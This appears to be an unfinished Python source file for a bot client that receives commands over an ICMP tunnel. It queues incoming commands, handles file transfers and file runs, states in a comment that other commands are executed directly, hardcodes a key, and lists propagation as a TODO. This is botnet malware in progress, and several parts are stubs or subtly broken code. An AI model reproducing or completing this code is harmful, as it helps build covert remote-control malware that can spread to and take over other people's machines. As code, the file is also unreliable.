from icmp_tunnel import *
import threading

DECRYPTION_KEY = "pass123"
cmdQueue = Queue.Queue()
Files = []

class Handler(threading.Thread):
    def __init__(self, q):
        self.q = q
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if not self.q.empty():

                #BUILT IN CMD FORMAT IS AS FOLLOWS
                #<command here> | arg1 arg2 arg3
                #OTHERWISE COMMANDS WILL JUST BE EXECUTED VIA os.execl(command)

                cmd = self.q.get()

                if cmd == "FILE-TRANSFER-START":
                    buf = []
                    Files.append(buf)
                    FileReciever(buf)
                    FileReciever.start()
                elif cmd == "NEW-BOT-RESPONSE":#ARGS- <<OTHER DATA HERE>>
                    pass
                elif cmd == "RUN-FILE":#ARGS-ID
                    pass
                elif cmd == "SAVE-FILE":#ARGS-ID
                    pass


def main():
    listener = Listener(cmdQueue)
    handler = Handler(cmdQueue)
    listener.start()
    handler.start()


##TODO: TEST FILE TRANSFERS
##TODO: IMPLEMENT BOT BUILT-IN'S
##TODO: PROPAGATION AND MANAGEMENT

